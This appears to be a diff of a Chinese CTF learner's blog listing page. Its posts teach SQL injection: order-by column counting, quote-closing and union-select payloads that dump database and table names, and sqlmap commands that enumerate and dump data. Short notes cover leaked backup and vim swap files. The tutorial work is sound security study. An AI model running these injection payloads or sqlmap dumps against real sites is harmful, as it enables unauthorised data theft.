-<li>应用恶意数据：开发者默认存入数据库中的数据都是安全的，在进行查询时，直接从数据库中取出恶意数据，没有进行下一步的校验处理</li>
-<li><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220712142916.png"></li>
-</ol>
-<h3 id="关键字"><a href="#关键字" class="headerlink" title="关键字"></a>关键字</h3><ol>
-<li>注册用户：insert xiaodi’</li>
-<li>修改用户：update</li>
-</ol>
-<h3 id="二次注入功能点"><a href="#二次注入功能点" class="headerlink" title="二次注入功能点"></a>二次注入功能点</h3><h2 id="过滤"><a href="#过滤" class="headerlink" title="过滤"></a>过滤</h2><h3 id="过滤函数addslashes"><a href="#过滤函数addslashes" class="headerlink" title="过滤函数addslashes"></a>过滤函数addslashes</h3><ol>
-<li>addslashes()函数在指定的预定义字符前添加反斜杠，这些字符是：单引号（’）、双引号（”）、反斜线（\）与NUL（NULL字符）。</li>
-<li>定义：string addslashes ( string $str )</li>
-</ol>
-<h2 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h2><h3 id="seay"><a href="#seay" class="headerlink" title="seay"></a>seay</h3><ol>
-<li>关键字搜索，使用全局搜索,搜索可控变量或者执行函数</li>
-<li>搜索例如select update insert 等sql语句函数，看看是否有可控变量，没有可控变量就是死sql语句，无法进行sql注入</li>
-<li>函数查询</li>
-<li>找到具体函数之后，右键定位函数使用的位置<img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220713003157.png"></li>
-<li><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220713003157.png"></li>
-</ol>
-<h4 id="步骤-1"><a href="#步骤-1" class="headerlink" title="步骤"></a>步骤</h4><ol>
-<li>搜索select</li>
-<li>找到变量</li>
-<li>找到变量调用函数</li>
-<li>右键定位函数调用位置</li>
-<li>看看页面和数据库的互动，根据回显判断注入点</li>
-</ol>
-<h4 id="判断过滤机制"><a href="#判断过滤机制" class="headerlink" title="判断过滤机制"></a>判断过滤机制</h4><ol>
-<li>看配置文件，看配置文件的关键字，例如：fun、inc</li>
-</ol>
-
-        </div>
-    
-
-</div>
-            
-                
-<div class="post">
-
-    <div class="post-header index">
-        <h1 class="title">
-            <a href="/%E6%AF%94%E8%B5%9B%E5%BF%85%E7%9C%8Bsql%E6%B3%A8%E5%85%A5/">
-                sql注入的基本原理
-            </a>
-        </h1>
-        <div class="post-info">
-            
-                <span class="date">2022-02-14</span>
-            
-            
-                <a href="http://dezhoutorizhao.github.io/%E6%AF%94%E8%B5%9B%E5%BF%85%E7%9C%8Bsql%E6%B3%A8%E5%85%A5/#disqus_thread" class="comments article-comment-link">留言</a>
-            
-            
-                <span class="category">
-                    <a href="/categories/sql注入/">sql注入</a>
-                </span>
-            
-        </div>
-    </div>
-
-    
-        <div class="content">
-            <h1 id="比赛必看sql注入"><a href="#比赛必看sql注入" class="headerlink" title="比赛必看sql注入"></a>比赛必看sql注入</h1><h2 id="操作："><a href="#操作：" class="headerlink" title="操作："></a>操作：</h2><h3 id=""><a href="#" class="headerlink" title=""></a></h3><ol>
-<li>用order by后面拼接数字，确定字段数量，如果大于，则页面错误或无内容，若小于或等于，则页面正常，若错误页和正常页一样，更换报错注入/盲注</li>
-<li>可以使用二分法来判断列的数量<h3 id="-1"><a href="#-1" class="headerlink" title=""></a></h3></li>
-<li>判断页面回显数据的字段位置，使用union select 1,2,3```定义的数字显示在页面上，即可从中判断页面显示的字段位置<h3 id="-2"><a href="#-2" class="headerlink" title=""></a></h3></li>
-<li>在显示的字段位置使用子查询来查询数据，或直接查询也可</li>
-</ol>
-<h2 id="单引号闭合问题"><a href="#单引号闭合问题" class="headerlink" title="单引号闭合问题"></a>单引号闭合问题</h2><ol>
-<li>加入执行的语句为select * from admin where ‘$id’</li>
-<li>如果id = 1 and 1 = 2</li>
-<li>则会有select * from admin where ‘1 and 1 = 2’,1=2被当作字符串处理</li>
-<li>如果id = 1’ and 1=2–+</li>
-<li>则会有select * from admin where ‘1’ and 1=2 –+’ 闭合了，然后注释掉后面多余的单引号<h2 id="当id-1’时，数字型和单引号包裹的字符型都会报错，但是双引号包裹不会报错"><a href="#当id-1’时，数字型和单引号包裹的字符型都会报错，但是双引号包裹不会报错" class="headerlink" title="当id=1’时，数字型和单引号包裹的字符型都会报错，但是双引号包裹不会报错"></a>当id=1’时，数字型和单引号包裹的字符型都会报错，但是双引号包裹不会报错</h2></li>
-</ol>
-<h2 id="判断是否有注入"><a href="#判断是否有注入" class="headerlink" title="判断是否有注入"></a>判断是否有注入</h2><ol>
-<li>可控参数(id)的改变能否影响页面显示结果</li>
-<li>输入的SQL语句是否能报错-能通过数据库的报错，看到数据库的一些语句痕迹</li>
-<li>输入的SQL语句能否不报错-我们的语句能否成功闭合<h3 id="-3"><a href="#-3" class="headerlink" title=""></a></h3></li>
-<li>?id=</li>
-</ol>
-<h2 id="判断是什么类型的注入"><a href="#判断是什么类型的注入" class="headerlink" title="判断是什么类型的注入"></a>判断是什么类型的注入</h2><h2 id="判断语句是否能够被恶意修改"><a href="#判断语句是否能够被恶意修改" class="headerlink" title="判断语句是否能够被恶意修改"></a>判断语句是否能够被恶意修改</h2><h2 id="是否能够成功执行"><a href="#是否能够成功执行" class="headerlink" title="是否能够成功执行"></a>是否能够成功执行</h2><h2 id="获取我们想要的数据"><a href="#获取我们想要的数据" class="headerlink" title="获取我们想要的数据"></a>获取我们想要的数据</h2><h3 id="-4"><a href="#-4" class="headerlink" title=""></a></h3><p>数据都是保存在数据库中-》表-》字段-》值</p>
-<h2 id="mysql自带的表"><a href="#mysql自带的表" class="headerlink" title="mysql自带的表"></a>mysql自带的表</h2><h3 id="mysql"><a href="#mysql" class="headerlink" title="mysql"></a>mysql</h3><h3 id="information-schema"><a href="#information-schema" class="headerlink" title="information schema"></a>information schema</h3><ol>
-<li>information_schema这张数据表保存了所有MYSQL服务器所有数据库的信息，例如数据库名，数据库的表，表栏的数据类型和访问权限。</li>
-<li>schemata：提供了关于数据库的信息</li>
-<li>tables：给出了关于数据库中表的信息</li>
-<li>column：表中列的信息</li>
-<li>STATISTICS表：给出了关于表索引的信息。</li>
-<li>USER_PRIVILEGES表：给出了关于全程权限的信息。该信息源自mysql.user授权表。</li>
-<li><img src="https://s2.loli.net/2022/05/09/2hpCTjqRuEYcDBG.png"></li>
-<li>SCHEMA_PRIVILEGES表：给出了关于方案（数据库）权限的信息。该信息来自mysql.db授权表。</li>
-<li><img src="https://s2.loli.net/2022/05/09/SMJ2fB4GNZYVAHx.png"></li>
-<li>TABLE_PRIVILEGES表：给出了关于表权限的信息。该信息源自mysql.tables_priv授权表。</li>
-<li><img src="https://s2.loli.net/2022/05/09/LTyYzAmUPCSJXgs.png"></li>
-<li>COLUMN_PRIVILEGES表：给出了关于列权限的信息。该信息源自mysql.columns_priv授权表。</li>
-<li>TABLE_CONSTRAINTS表：描述了存在约束的表。</li>
-<li>KEY_COLUMN_USAGE表：描述了具有约束的键列。</li>
-<li>VIEWS表：给出了关于数据库中的视图的信息。</li>
-<li><a target="_blank" rel="noopener" href="https://blog.csdn.net/zhang_jgang/article/details/50819142">https://blog.csdn.net/zhang_jgang/article/details/50819142</a><h4 id="information-schema中的操作"><a href="#information-schema中的操作" class="headerlink" title="information schema中的操作"></a>information schema中的操作</h4></li>
-<li>查看库中所有的表，表名等：select * from information_schema.tables</li>
-</ol>
-
-        </div>
-    
-
-</div>
-            
-        </section>
-    </div>
-</div>
-
-
-
-    <div class="row">
-        <div class="col-sm-12">
-            <div class="wrap-pagination">
-                <a class="" href="/page/9/">
-                    <i class="fa fa-chevron-left" aria-hidden="true"></i>
-                </a>
-                <a class="" href="/page/11/">
-                    <i class="fa fa-chevron-right" aria-hidden="true"></i>
-                </a>
+      const detectApple = () => {
+        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+          document.documentElement.classList.add('apple')
+        }
+      }
+      detectApple()
+    })(window)</script><meta name="generator" content="Hexo 5.4.0"></head><body><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/QQ图片20240111033823.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">106</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">50</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">70</div></a></div><hr class="custom-hr"/></div></div><div class="page" id="body-wrap"><header class="full_page" id="page-header" style="background: transparent"><nav id="nav"><span id="blog-info"><a href="/" title="h3110w0r1d's Blog"><span class="site-name">h3110w0r1d's Blog</span></a></span><div id="menus"><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="site-info"><h1 id="site-title">h3110w0r1d's Blog</h1></div><div id="scroll-down"><i class="fas fa-angle-down scroll-down-effects"></i></div></header><main class="layout" id="content-inner"><div class="recent-posts" id="recent-posts"><div class="recent-post-item"><div class="recent-post-info no-cover"><a class="article-title" href="/create%20tables%E9%80%89%E9%A1%B9/" title="sql约束">sql约束</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time datetime="2022-03-29T03:53:38.451Z" title="发表于 2022-03-29 11:53:38">2022-03-29</time></span><span class="article-meta"><span class="article-meta-separator">|</span><i class="fas fa-inbox"></i><a class="article-meta__categories" href="/categories/%E6%95%B0%E6%8D%AE%E5%BA%93/">数据库</a></span></div><div class="content">create tables选项定义列的时候，指定列选项约束的概念
+对表中的数据进行限定，保证数据的正确性。有效性和完整性DEFAULT 定义列的默认值
+当插入一个新行到表中并且没有给该列明确赋值时，如果定义了列的默认值，将自动得到默认值，如果没有为null
+sex char(1) default ‘m’
+
+COMMENT 用来给列添加注释，最多255个字符，注释保存到数据字典中
+创建带有列注释的表stu_commentcreate table stu_comment( id int not null primary key, comment ‘学号’ name varchar(20) not null, comment ‘姓名’);从数据字典查询注释信息
+select comumn_name,column_comment
+from information_schema.columns
+where table_name=’stu_comment’
+
+常见的约束类型
+not null 非空类型，指定某列不为空
+unique 唯一约束，指定某列和几列组合的数据不能重复
+primary key ...</div></div></div><div class="recent-post-item"><div class="recent-post-info no-cover"><a class="article-title" href="/foreign%20key%E7%94%A8%E6%B3%95%E8%AF%A6%E8%A7%A3/" title="foreign key用法详解">foreign key用法详解</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time datetime="2022-03-29T03:53:28.982Z" title="发表于 2022-03-29 11:53:28">2022-03-29</time></span><span class="article-meta"><span class="article-meta-separator">|</span><i class="fas fa-inbox"></i><a class="article-meta__categories" href="/categories/%E6%95%B0%E6%8D%AE%E5%BA%93/">数据库</a></span></div><div class="content">foreign key用法详解引子：把所有数据都存放于一张表的弊端
+组织结构复杂比清晰
+浪费空间
+拓展性差
+
+表和表之间存在的三种关系
+一对多
+多对多
+一对一
+
+多对多
+先站在表emp的角度
+去找表emp的多条记录能否对应表dep的一条记录。
+翻译2的意义：
+左表emp的多条记录==》多个员工
+右表dep的一条记录==》一个部门
+最终翻译结果：多个员工是否可以属于一个部门？
+如果是则需要进行part2的流程
+
+</div></div></div><div class="recent-post-item"><div class="recent-post-info no-cover"><a class="article-title" href="/zip%E4%BC%AA%E5%8A%A0%E5%AF%86%E5%8F%82%E8%80%83%E5%8D%9A%E5%AE%A2%E5%9C%B0%E5%9D%80/" title="zip伪加密">zip伪加密</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time datetime="2022-03-27T03:03:10.010Z" title="发表于 2022-03-27 11:03:10">2022-03-27</time></span><span class="article-meta"><span class="article-meta-separator">|</span><i class="fas fa-inbox"></i><a class="article-meta__categories" href="/categories/CTF/">CTF</a><i class="fas fa-angle-right article-meta-link"></i><a class="article-meta__categories" href="/categories/CTF/zip%E4%BC%AA%E5%8A%A0%E5%AF%86/">zip伪加密</a><i class="fas fa-angle-right article-meta-link"></i><a class="article-meta__categories" href="/categories/CTF/zip%E4%BC%AA%E5%8A%A0%E5%AF%86/%E6%96%87%E4%BB%B6%E4%BF%AE%E5%A4%8D/">文件修复</a></span></div><div class="content">参考博客地址
+https://www.cnblogs.com/cute-puli/p/16042101.html
+
+zip伪加密010或者winhex
+建议使用010editor
+因为可以自动区分数据区，目录区和目录结束标志zip文件组成
+压缩源文件数据区
+压缩源文件目录区
+压缩源文件目录结束标志
+
+奇数为加密，偶数为不加密无加密：
+压缩源文件数据区的全局加密应为00 00
+压缩源文件目录区的全局方式位标记应为00 00
+
+假加密
+压缩源文件数据区的全局加密应为00 00
+压缩源文件目录区的全局加密方式应为 00 90
+
+真加密
+压缩源文件数据区的全局加密应为00 00
+压缩源文件目录去的全局方式应为00 90
+
+压缩源文件数据区：50 4B 03 04：这是头文件标记（0x04034b50）14 00：解压文件所需 pkware 版本00 00：全局方式位标记（有无加密）08 00：压缩方式5A 7E：最后修改文件时间F7 46：最后修改文件日期16 B5 80 14：CRC-32校验（1480B516）19 00 00 00：压缩后尺寸（25）17 00 00 00：未压缩尺寸（2 ...</div></div></div><div class="recent-post-item"><div class="recent-post-info no-cover"><a class="article-title" href="/%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/" title="信息泄露">信息泄露</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time datetime="2022-03-27T03:02:08.636Z" title="发表于 2022-03-27 11:02:08">2022-03-27</time></span><span class="article-meta"><span class="article-meta-separator">|</span><i class="fas fa-inbox"></i><a class="article-meta__categories" href="/categories/%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/">信息泄露</a><i class="fas fa-angle-right article-meta-link"></i><a class="article-meta__categories" href="/categories/%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/CTF/">CTF</a></span></div><div class="content">信息泄露备份文件下载网站源码bak文件下载
+访问目录下的bak文件
+题目提示source 在index.php下，所以用hackbar访问index.php.bak
+将bak文件后缀改为txt或者用notepad++打开即可获得flag
+
+vim缓存
+vim会自动生成备份文件和临时文件
+临时文件是在编辑文本时就会创建的文件，如果程序正常退出，临时文件自动删除
+如果意外退出则会保留，名为.filename.swp
+第一次产生的交换文件名为“.filename.txt.swp”；再次意外退出后，将会产生名为“.filename.txt.swo”的交换文件；而第三次产生的交换文件则为“.filename.txt.swn
+因为这里已经告诉我们是index.php了，所以其意外退出而保留的临时文件是 .index.php.swp
+
+phpinfo
+直接打开页面发现是phpinfo界面
+思路是从表中搜索flag的信息
+浏览器中ctrl+f查找（和wires hark相同）flag
+
+信息泄露问题目录遍历
+用菜刀爬或者用御剑字典爆破搜就完了
+
+观察之间的不同
+一开始我还以为c=d o=a之类的是将下 ...</div></div></div><div class="recent-post-item"><div class="recent-post-info no-cover"><a class="article-title" href="/burpsuit%20intruder%E7%9A%84%E5%9B%9B%E7%A7%8D%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F/" title="burpsuit intruder的四种攻击方式">burpsuit intruder的四种攻击方式</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time datetime="2022-03-25T16:00:00.000Z" title="发表于 2022-03-26 00:00:00">2022-03-26</time></span><span class="article-meta"><span class="article-meta-separator">|</span><i class="fas fa-inbox"></i><a class="article-meta__categories" href="/categories/CTF/">CTF</a></span></div><div class="content">burpsuit intruder的四种攻击方式sniper狙击手模式
+使用一组payload集合，一次只使用一个payload位置battering ram 攻城锤模式
+只使用一个payload集合，每次攻击都是替换所有payload标记位置
+与狙击手模式不同点在于狙击手每次只替换一个标记位置，而攻城锤替换所有的标记位置三Pitchfork（草叉模式）四Cluster bomb（集束炸弹模式）
+
+</div></div></div><div class="recent-post-item"><div class="recent-post-info no-cover"><a class="article-title" href="/sqlmap%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95/" title="sqlmap使用方法">sqlmap使用方法</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time datetime="2022-03-23T11:41:03.379Z" title="发表于 2022-03-23 19:41:03">2022-03-23</time></span><span class="article-meta"><span class="article-meta-separator">|</span><i class="fas fa-inbox"></i><a class="article-meta__categories" href="/categories/CTF/">CTF</a><i class="fas fa-angle-right article-meta-link"></i><a class="article-meta__categories" href="/categories/CTF/%E8%84%9A%E6%9C%AC%E5%B0%8F%E5%AD%90/">脚本小子</a><i class="fas fa-angle-right article-meta-link"></i><a class="article-meta__categories" href="/categories/CTF/%E8%84%9A%E6%9C%AC%E5%B0%8F%E5%AD%90/sql%E6%B3%A8%E5%85%A5/">sql注入</a></span></div><div class="content">sqlmap使用方法判断是否能注入
+python sqlmap.py -u “url?id=1”找库
+python sqlmap.py -u “url?id=1” –dbs
+
+找表
+python sqlmap.py -u “url?id=1” -D 库名 –tables
+
+找列
+python sqlmap.py -u “url?id=1” -D 库名 -T 表名 –columns
+
+dump掉信息
+python sqlmap.py -u “url?id=1” -D 库名 -T 表名 -C 列名 –dump
+或者列名前加–columns
+
+参考博客
+https://www.cnblogs.com/ichunqiu/p/5805108.html
+
+嗅探等级：不加level时默认为1，5级包含的payload最多，会自动破解出cookie和XFF等头部注入，相对应的速度也较慢当不能确定哪个payload时或参数作为注入点，可以使用较高的level值level 2
+http cookie测试
+
+level 3
+http user-agent/referer头回测试
+
+参考博客
+https:// ...</div></div></div><div class="recent-post-item"><div class="recent-post-info no-cover"><a class="article-title" href="/n%E7%9A%84%E4%BA%8C%E8%BF%9B%E5%88%B6%E8%A1%A8%E7%A4%BA%E4%B8%AD%E7%AC%ACk%E4%BD%8D%E6%95%B0%E5%AD%97%E6%98%AF%E5%87%A0/" title="n的二进制表示中第k位数字是几">n的二进制表示中第k位数字是几</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time datetime="2022-03-05T09:56:01.498Z" title="发表于 2022-03-05 17:56:01">2022-03-05</time></span><span class="article-meta"><span class="article-meta-separator">|</span><i class="fas fa-inbox"></i><a class="article-meta__categories" href="/categories/acm%E7%AE%97%E6%B3%95/">acm算法</a></span></div><div class="content">n的二进制表示中第k位数字是几
+先把第k位数字移到最后一位 n&gt;&gt;k
+看个位是几 x&amp;1除以2相当于二进制数右移1位
+即右移1位相当于除以2，相当于除去二进制数中的下一位按位与操作：
+相当于取出某一位
+int a = 1010
+a &amp; 1 = 0
+a &amp; 11 = 2  (10的二进制表示为2)
+
+lowbit操作
+lowbit(x)是返回x的最后一位1
+相当于x&amp;-x=x&amp;(~x+1)
+
+</div></div></div><div class="recent-post-item"><div class="recent-post-info no-cover"><a class="article-title" href="/%E6%89%8B%E5%8A%A8%E6%B3%A8%E5%85%A5%E8%AF%AD%E6%B3%95/" title="sql注入漏洞">sql注入漏洞</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time datetime="2022-02-15T07:09:51.740Z" title="发表于 2022-02-15 15:09:51">2022-02-15</time></span><span class="article-meta"><span class="article-meta-separator">|</span><i class="fas fa-inbox"></i><a class="article-meta__categories" href="/categories/CTF/">CTF</a><i class="fas fa-angle-right article-meta-link"></i><a class="article-meta__categories" href="/categories/CTF/sql%E6%B3%A8%E5%85%A5/">sql注入</a><i class="fas fa-angle-right article-meta-link"></i><a class="article-meta__categories" href="/categories/CTF/sql%E6%B3%A8%E5%85%A5/%E6%89%8B%E5%8A%A8%E6%B3%A8%E5%85%A5/">手动注入</a></span></div><div class="content">sql注入漏洞对information_shcema的理解
+shcema可以看作是房间
+table_schema是用来存放table表的房间，是数据库
+table_name是表的名字
+table_type是表的类型
+
+对group_concat和concat_ws的理解
+group_concat可以将多行数据整合为一行
+concat可以将不同数据用第一个参数链接
+可以写group_concat(concat_ws(‘:’,id,email_id))
+
+数字型注入判断是否有注入点
+1 and 1=1正确
+1 and 1=2不正确，所以可以判断是整数型注入
+
+判断字段数
+order by 1,2,3,4….
+可以使用二分法来判断
+为下一步联合查询爆数据库名奠定基础
+数据库ctf
+
+
+
+爆数据库名
+?id=1 and 1=2 union select 1.database()
+注意此处联合查询需要前后字段数量一致，且字段数与上一步使用order by 判断的一致
+
+
+爆表名
+?id=1 and 1=2 union select 1,group_concat(table_name) from  ...</div></div></div><div class="recent-post-item"><div class="recent-post-info no-cover"><a class="article-title" href="/%E6%AF%94%E8%B5%9B%E5%BF%85%E7%9C%8Bsql%E6%B3%A8%E5%85%A5/" title="sql注入的基本原理">sql注入的基本原理</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time datetime="2022-02-14T06:43:21.307Z" title="发表于 2022-02-14 14:43:21">2022-02-14</time></span><span class="article-meta"><span class="article-meta-separator">|</span><i class="fas fa-inbox"></i><a class="article-meta__categories" href="/categories/sql%E6%B3%A8%E5%85%A5/">sql注入</a><i class="fas fa-angle-right article-meta-link"></i><a class="article-meta__categories" href="/categories/sql%E6%B3%A8%E5%85%A5/CTF/">CTF</a><i class="fas fa-angle-right article-meta-link"></i><a class="article-meta__categories" href="/categories/sql%E6%B3%A8%E5%85%A5/CTF/ing/">ing</a></span></div><div class="content">比赛必看sql注入操作：
+用order by后面拼接数字，确定字段数量，如果大于，则页面错误或无内容，若小于或等于，则页面正常，若错误页和正常页一样，更换报错注入/盲注
+可以使用二分法来判断列的数量
+判断页面回显数据的字段位置，使用union select 1,2,3```定义的数字显示在页面上，即可从中判断页面显示的字段位置
+在显示的字段位置使用子查询来查询数据，或直接查询也可
+
+单引号闭合问题
+加入执行的语句为select * from admin where ‘$id’
+如果id = 1 and 1 = 2
+则会有select * from admin where ‘1 and 1 = 2’,1=2被当作字符串处理
+如果id = 1’ and 1=2–+
+则会有select * from admin where ‘1’ and 1=2 –+’ 闭合了，然后注释掉后面多余的单引号当id=1’时，数字型和单引号包裹的字符型都会报错，但是双引号包裹不会报错
+
+判断是否有注入
+可控参数(id)的改变能否影响页面显示结果
+输入的SQL语句是否能报错-能通过数据库的报错，看到数据库的一些语句 ...</div></div></div><nav id="pagination"><div class="pagination"><a class="extend prev" rel="prev" href="/page/9/#content-inner"><i class="fas fa-chevron-left fa-fw"></i></a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/9/#content-inner">9</a><span class="page-number current">10</span><a class="page-number" href="/page/11/#content-inner">11</a><a class="page-number" href="/page/12/#content-inner">12</a><a class="extend next" rel="next" href="/page/11/#content-inner"><i class="fas fa-chevron-right fa-fw"></i></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/QQ图片20240111033823.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">h3110w0r1d</div><div class="author-info__description">CTF web手、Golang后端开发工程师 研究多线程高并发、渗透测试      Web安全</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">106</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">50</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">70</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/dezhoutorizhao?tab=repositories"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">h3110w0r1d师傅又发布了新博客了，快去看看吧</div></div><div class="sticky_layout"><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2023%E5%A4%8D%E7%9B%98/" title="2023复盘">2023复盘</a><time datetime="2024-01-10T16:41:46.332Z" title="发表于 2024-01-11 00:41:46">2024-01-11</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/%E4%BE%A7%E4%BF%A1%E9%81%93%E6%94%BB%E5%87%BB/" title="侧信道攻击">侧信道攻击</a><time datetime="2023-09-26T09:03:09.760Z" title="发表于 2023-09-26 17:03:09">2023-09-26</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%8D%8A%E5%86%B3%E8%B5%9B_%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81/" title="蓝帽杯半决赛wp_电子取证部分">蓝帽杯半决赛wp_电子取证部分</a><time datetime="2023-09-16T13:26:55.732Z" title="发表于 2023-09-16 21:26:55">2023-09-16</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%8D%8A%E5%86%B3%E8%B5%9B_web/" title="蓝帽杯半决赛wp_web部分">蓝帽杯半决赛wp_web部分</a><time datetime="2023-09-16T13:18:03.466Z" title="发表于 2023-09-16 21:18:03">2023-09-16</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/" title="数据结构">数据结构</a><time datetime="2023-08-30T08:37:08.678Z" title="发表于 2023-08-30 16:37:08">2023-08-30</time></div></div></div></div><div class="card-widget card-categories"><div class="item-headline">
+            <i class="fas fa-folder-open"></i>
+            <span>分类</span>
+            <a class="card-more-btn" href="/categories/" title="查看更多">
+    <i class="fas fa-angle-right"></i></a>
             </div>
-        </div>
-    </div>
-
-
-
-
-</div>
-
-<!-- Footer -->
-<div class="push"></div>
-
-<footer class="footer-content">
-    <div class="container">
-        <div class="row">
-            <div class="col-xs-12 col-sm-12 col-md-6 col-lg-6 footer-about">
-                <h2>About</h2>
-                <p>
-                    拒绝划水，拒绝摸鱼
-                </p>
-            </div>
-            
-    <div class="col-xs-6 col-sm-6 col-md-3 col-lg-3 recent-posts">
-        <h2>Recent Posts</h2>
-        <ul>
-            
-            <li>
-                <a class="footer-post" href="/2023%E5%A4%8D%E7%9B%98/">2023复盘</a>
-            </li>
-            
-            <li>
-                <a class="footer-post" href="/%E4%BE%A7%E4%BF%A1%E9%81%93%E6%94%BB%E5%87%BB/">侧信道攻击</a>
-            </li>
-            
-            <li>
-                <a class="footer-post" href="/%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%8D%8A%E5%86%B3%E8%B5%9B_%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81/">蓝帽杯半决赛wp_电子取证部分</a>
-            </li>
-            
-            <li>
-                <a class="footer-post" href="/%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%8D%8A%E5%86%B3%E8%B5%9B_web/">蓝帽杯半决赛wp_web部分</a>
-            </li>
-            
-        </ul>
-    </div>
-
-
-
-            
-<div class="col-xs-6 col-sm-6 col-md-3 col-lg-3 footer-categories">
-    <h2>Categories</h2>
-    <ul>
-        
-        <li>
-            <a class="footer-post" href="/categories/CSS/">CSS</a>
-        </li>
-        
-        <li>
-            <a class="footer-post" href="/categories/CSS/ing/">ing</a>
-        </li>
-        
-        <li>
-            <a class="footer-post" href="/categories/Hadoop/">Hadoop</a>
-        </li>
-        
-        <li>
-            <a class="footer-post" href="/categories/ing/">ing</a>
-        </li>
-        
-    </ul>
-</div>
-
-        </div>
-        <div class="row">
-            <div class="col-xs-12 col-sm-12 col-md-12 col-lg-12">
-                <ul class="list-inline footer-social-icons">
-                    
-                    <li class="list-inline-item">
-                        <a target="_blank" rel="noopener" href="https://github.com/dezhoutorizhao/blog6">
-                            <span class="footer-icon-container">
-                                <i class="fa fa-github"></i>
-                            </span>
-                        </a>
-                    </li>
-                    
-                    
-                    <li class="list-inline-item">
-                        <a target="_blank" rel="noopener" href="https://github.com/dezhoutorizhao/blog6">
-                            <span class="footer-icon-container">
-                                <i class="fa fa-twitter"></i>
-                            </span>
-                        </a>
-                    </li>
-                    
-                    
-                    <li class="list-inline-item">
-                        <a target="_blank" rel="noopener" href="https://github.com/dezhoutorizhao/blog6">
-                            <span class="footer-icon-container">
-                                <i class="fa fa-facebook"></i>
-                            </span>
-                        </a>
-                    </li>
-                    
-                    
-                    <li class="list-inline-item">
-                        <a target="_blank" rel="noopener" href="https://github.com/dezhoutorizhao/blog6">
-                            <span class="footer-icon-container">
-                                <i class="fa fa-instagram"></i>
-                            </span>
-                        </a>
-                    </li>
-                    
-                    
-                    <li class="list-inline-item">
-                        <a target="_blank" rel="noopener" href="https://github.com/dezhoutorizhao/blog6">
-                            <span class="footer-icon-container">
-                                <i class="fa fa-dribbble"></i>
-                            </span>
-                        </a>
-                    </li>
-                    
-                    
-                    <li class="list-inline-item">
-                        <a href="http://dezhoutorizhao.github.io/blog6/">
-                            <span class="footer-icon-container">
-                                <i class="fa fa-telegram"></i>
-                            </span>
-                        </a>
-                    </li>
-                    
-                    
-                    <li class="list-inline-item">
-                        <a href="http://dezhoutorizhao.github.io/blog6/">
-                            <span class="footer-icon-container">
-                                <i class="fa fa-behance"></i>
-                            </span>
-                        </a>
-                    </li>
-                    
-                    
-                    <li class="list-inline-item">
-                        <a href="http://dezhoutorizhao.github.io/blog6/">
-                            <span class="footer-icon-container">
-                                <i class="fa fa-500px"></i>
-                            </span>
-                        </a>
-                    </li>
-                    
-                    
-                    <li class="list-inline-item">
-                        <a href="mailto:a18888200398@163.com/">
-                            <span class="footer-icon-container">
-                                <i class="fa fa-envelope-o"></i>
-                            </span>
-                        </a>
-                    </li>
-                    
